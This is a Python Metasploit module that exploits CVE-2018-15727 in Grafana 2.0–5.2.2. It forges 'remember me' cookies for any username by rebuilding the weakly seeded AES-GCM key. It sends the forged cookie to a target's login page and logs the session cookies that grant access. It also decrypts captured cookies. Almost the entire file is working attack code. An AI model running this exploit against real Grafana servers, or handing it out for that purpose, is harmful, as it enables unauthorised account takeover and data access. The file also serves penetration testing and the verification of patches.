#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Grafana 2.0-5.2.2 authentication bypass exploit module (CVE-2018-15727).

This module exploits a vulnerability in Grafana's remember me cookie
generation for LDAP and OAuth authentication. Due to improper seeding,
it's possible to craft valid remember me cookies for any username.
"""

# standard modules
import binascii
import hashlib
import logging
import os
import re

from metasploit import module

# extra modules
dependencies_requests_missing = False
try:
    import requests
except ImportError:
    dependencies_requests_missing = True

dependencies_cryptography_missing = False
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    dependencies_cryptography_missing = True


metadata = {
    'name': 'Grafana 2.0 through 5.2.2 authentication bypass for LDAP and OAuth',
    'description': '''
        This module generates a remember me cookie for a valid username. Through unpropper seeding 
        while userdate are requested from LDAP or OAuth it's possible to craft a valid remember me cookie. 
        This cookie can be used for bypass authentication for everyone knowing a valid username.
    ''',
    'authors': [
        'Rene Riedling',
        'Sebastian Solnica'  # Original Discovered
    ],
    'date': '2019-08-14',  # set to date of creation
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2018-15727'},
        {'type': 'url', 'ref': 'https://grafana.com/blog/2018/08/29/grafana-5.2.3-and-4.6.4-released-with-important-security-fix/'}
    ],
    'type': 'single_scanner',
    'options': {
        'VERSION': {'type': 'enum', 'description': 'Grafana version: "2-4" or "5"', 'required': True, 'default': '5', 'values': ['2-4', '5']},
        'USERNAME': {'type': 'string', 'description': 'Valid username', 'required': False},
        'RHOSTS': {'type': 'address', 'description': 'Address of target', 'required': True, 'default': '127.0.0.1'},
        'RPORT': {'type': 'port', 'description': 'Port of target', 'required': True, 'default': 3000},
        'COOKIE': {'type': 'string', 'description': 'Decrypt captured cookie', 'required': False},
        'TARGETURI': {'type': 'string', 'description': 'Base URL of grafana instance', 'required': False, 'default': '/'},
        'SSL': {'type': 'bool', 'description': 'set SSL/TLS based connection', 'required': True, 'default': False}
    }
}


def encrypt_version5(username):
    """
    Encrypt a username into a Grafana 5.x remember me cookie.

    Exploits the weak seeding in Grafana 5.x cookie generation.

    Args:
        username: Username to encrypt into cookie

    Returns:
        Hex-encoded cookie string (nonce + ciphertext)
    """
    salt = b''
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    username = username.encode()
    ct = aesgcm.encrypt(nonce, username, None)
    cookie = str(binascii.hexlify(nonce), 'ascii') + \
        str(binascii.hexlify(ct), 'ascii')
    return cookie


def encrypt_version4(username):
    """
    Encrypt a username into a Grafana 2.x-4.x remember me cookie.

    Exploits the weak seeding in Grafana 2.x-4.x cookie generation.

    Args:
        username: Username to encrypt into cookie

    Returns:
        Hex-encoded cookie string (nonce + ciphertext)
    """
    salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    username = username.encode()
    ct = aesgcm.encrypt(nonce, username, None)
    cookie = str(binascii.hexlify(nonce), 'ascii') + \
        str(binascii.hexlify(ct), 'ascii')
    return cookie


def decrypt_version5(cookie):
    """
    Decrypt a Grafana 5.x remember me cookie to extract username.

    Args:
        cookie: Hex-encoded cookie string

    Returns:
        Decrypted username string
    """
    salt = b''
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = binascii.unhexlify(cookie[:24])
    ct = binascii.unhexlify(cookie[24:])
    username = str(aesgcm.decrypt(nonce, ct, None), 'ascii')
    return username


def decrypt_version4(cookie):
    """
    Decrypt a Grafana 2.x-4.x remember me cookie to extract username.

    Args:
        cookie: Hex-encoded cookie string

    Returns:
        Decrypted username string
    """
    salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = binascii.unhexlify(cookie[:24])
    ct = binascii.unhexlify(cookie[24:])
    username = str(aesgcm.decrypt(nonce, ct, None), 'ascii')
    return username


def run(args):
    """
    Execute the Grafana authentication bypass exploit.

    This function generates or decrypts Grafana remember me cookies and
    attempts to authenticate to the target using the crafted cookies.

    Args:
        args: Dictionary containing module options (VERSION, USERNAME, RHOSTS, etc.)

    Returns:
        None
    """
    if dependencies_requests_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return
    
    if dependencies_cryptography_missing:
        logging.error('Module dependency (cryptography) is missing, cannot continue')
        return
    
    if args['VERSION'] == "5":
        try:
            username = args['USERNAME']
            cookie = encrypt_version5(args['USERNAME'])
            module.log("Encrypted remember cookie: "+cookie, "good")
        except:
            module.log(
                "No username set, trying to decrypt it from cookie.", "warning")
            try:
                username = decrypt_version5(args['COOKIE'])
                module.log("Decrypted username: "+username, "good")
                cookie = args['COOKIE']
            except:
                module.log("Unable to set username", "error")
                return
    elif args['VERSION'] == "2-4":
        try:
            username = args['USERNAME']
            cookie = encrypt_version4(args['USERNAME'])
            module.log("Encrypted remember cookie: "+cookie, "good")
        except:
            module.log(
                "No username set, trying to decrypt it from cookie.", "warning")
            try:
                username = decrypt_version4(args['COOKIE'])
                module.log("Decrypted username: "+username, "good")
                cookie = args['COOKIE']
            except:
                module.log("Unable to set username", "error")
                return
    else:
        module.log("Version not supported.", "error")

    try:
        cookies = {'grafana_remember': cookie, 'grafana_user': username}

        if args['SSL'] == "false":
            if args['TARGETURI'].endswith('/'):
                url = "http://" + args['RHOSTS'] + ":" + \
                    args['RPORT'] + args['TARGETURI'] + "login/"
            else:
                url = "http://" + args['RHOSTS'] + ":" + \
                    args['RPORT'] + args['TARGETURI'] + "/login/"
        elif args['SSL'] == "true":
            if args['TARGETURI'].endswith('/'):
                url = "https://" + args['RHOSTS'] + ":" + \
                    args['RPORT'] + args['TARGETURI'] + "login/"
            else:
                url = "https://" + args['RHOSTS'] + ":" + \
                    args['RPORT'] + args['TARGETURI'] + "/login/"
        module.log('Targeting URL: ' + url, 'debug')
        r = requests.get(url=url, cookies=cookies, allow_redirects=False)

    except:
        module.log("Failed to sending request to host.", "error")
        return

    if r.status_code == 302:
        try:
            grafana_user = re.search(
                r"grafana_user=.*?;", r.headers['Set-Cookie']).group(0)
            grafana_remember = re.search(
                r"grafana_remember=.*?;", r.headers['Set-Cookie']).group(0)
            grafana_sess = re.search(
                r"grafana_sess=.*?;", r.headers['Set-Cookie']).group(0)

            module.log(
                "Set following cookies to get access to the grafana instance.", "good")
            module.log(grafana_user, "good")
            module.log(grafana_remember, "good")
            module.log(grafana_sess, "good")
        except:
            module.log("Failed to generate cookies out of request.", "error")
            return
    else:
        module.log("Target is not vulnerable.", "warning")
        return


if __name__ == '__main__':
    module.run(metadata, run)
